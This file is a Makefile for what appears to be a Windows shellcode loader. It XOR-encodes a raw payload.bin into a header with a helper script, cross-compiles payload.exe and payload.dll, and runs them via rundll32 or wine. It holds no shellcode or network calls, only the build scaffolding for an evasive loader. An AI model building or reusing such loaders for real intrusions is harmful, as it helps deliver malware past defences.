# Determine OS
ifeq ($(OS),Windows_NT)
	unameS := Windows
else
	unameS := $(shell uname -s)
endif

# Set some variables
ALLOC := STACK
BIN := local/payload.bin
override BUILD := ./build
CC := x86_64-w64-mingw32-g++
ENC := XOR
EXEC := THREAD
KEY := none
MINGW := -I/usr/x86_64-w64-mingw
ifeq ($(unameS),Windows)
    MINGW :=
endif
PAYLOAD :=
ifneq ($(wildcard payload.h),)
    PAYLOAD := -D PAYLOAD
endif

# Targets
all: dll exe;

clean:
ifeq ($(unameS),Windows)
ifneq ($(wildcard $(BUILD)),)
	powershell -c remove-item -force -recurse "$(BUILD)"
endif
else
	rm -f -r "$(BUILD)"
endif

clena: clean;

dbgexe: dir
	$(CC) \
	    -D ALLOC_$(ALLOC) \
	    -D ENC_$(ENC) \
	    -D EXEC_$(EXEC) \
	    $(PAYLOAD) \
	    -g \
	    $(MINGW) \
	    -o "$(BUILD)/payload.exe" \
	    -static \
	    *.cpp

dir:
ifeq ($(unameS),Windows)
ifeq ($(wildcard $(BUILD)),)
	powershell -c "new-item -itemtype directory \"$(BUILD)\" | out-null"
endif
else
	mkdir -p "$(BUILD)"
endif

dll: dir
	$(CC) \
	    -D ALLOC_$(ALLOC) \
	    -D DLL \
	    -D ENC_$(ENC) \
	    -D EXEC_$(EXEC) \
	    $(PAYLOAD) \
	    $(MINGW) \
	    -o "$(BUILD)/payload.dll" \
	    -shared \
	    -static \
	    *.cpp

exe: dir
	$(CC) \
	    -D ALLOC_$(ALLOC) \
	    -D ENC_$(ENC) \
	    -D EXEC_$(EXEC) \
	    $(PAYLOAD) \
	    $(MINGW) \
	    -o "$(BUILD)/payload.exe" \
	    -static \
	    *.cpp

ifeq ($(unameS),Windows)
rundll: dll
	rundll32 $(BUILD)/payload.dll,Start

runexe: exe
	$(BUILD)/payload.exe
else
runexe: exe
	wine $(BUILD)/payload.exe
endif

setup: $(BIN)
	python3 ./tools/scxor.py -k "$(KEY)" -o payload.h $(BIN)

superclean: clean
ifeq ($(unameS),Windows)
ifneq ($(wildcard payload.h),)
	powershell -c remove-item -force payload.h
endif
else
	rm -f payload.h
endif

superclena: superclean;

-include local/Makefile
